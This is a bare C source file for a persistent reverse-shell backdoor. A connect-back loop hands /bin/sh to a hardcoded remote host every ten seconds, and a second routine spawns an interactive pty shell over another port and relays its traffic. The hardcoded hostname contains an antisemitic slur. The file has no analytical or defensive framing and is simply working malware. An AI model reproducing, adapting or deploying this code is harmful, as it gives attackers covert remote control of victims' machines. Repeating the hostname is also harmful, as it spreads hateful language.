#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/time.h>
#include <string.h>
#include <pty.h>
#include <sys/poll.h>
#include <signal.h>

#define HOST "jew.69.mu"
#define COMM_PORT "44344"
#define REV_PORT "44345"

int conn(char *port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return -1;

    struct addrinfo hints = {0};
    struct addrinfo *res0;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(HOST, port, &hints, &res0) != 0) return -1;

    if (connect(sock, res0[0].ai_addr, res0[0].ai_addrlen) != 0) return -1;

    return sock;
}

void client_loop(void)
{
    int sock;
start:
    sock = conn(COMM_PORT);
    if (sock == -1) goto retry;

    pid_t pid;
    if (!(pid = fork()))
    {
        dup2(sock, 0);
        dup2(sock, 1);

        execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
    }
    int status;
    waitpid(pid, &status, 0);

retry:
    close(sock);
    sleep(10);
    goto start;
}

void rev_client(void)
{
    int master, slave;
    if (openpty(&master, &slave, NULL, NULL, NULL) == -1) return;

    int sock = conn(REV_PORT);
    if (sock == -1) return;

    struct timeval tv;
    gettimeofday(&tv, NULL);
    uint64_t token = 1000000 * tv.tv_sec + tv.tv_usec;
    char str[32];
    snprintf(str, sizeof(str), "%" PRIu64 "END\n", token);
    write(1, str, strlen(str));
    write(sock, str, strlen(str));

    pid_t pid;
    if (!(pid = fork()))
    {
        close(sock);
        close(master);

        close(0);
        close(1);
        close(2);
        dup2(slave, 0);
        dup2(slave, 1);
        dup2(slave, 2);

        setsid();

        execve("/bin/sh", (char *[]){PREFIX, NULL}, (char *[]){"TERM=xterm-256color", NULL});
    }

    close(slave);

    struct pollfd fds[2];
    fds[0].fd = sock;
    fds[0].events = POLLIN;
    fds[1].fd = master;
    fds[1].events = POLLIN;

    char buffer[1024];

    for (;;)
    {
        if (poll(fds, 2, -1) == -1) break;

        if (fds[0].revents & POLLIN)
        {
            int r = read(sock, buffer, sizeof(buffer));
            if (r <= 0) break;
            write(master, buffer, r);
        }

        if (fds[1].revents & POLLIN)
        {
            int r = read(master, buffer, sizeof(buffer));
            if (r <= 0) break;
            write(sock, buffer, r);
        }
    }

    close(master);
    close(sock);

    kill(pid, SIGKILL);
}
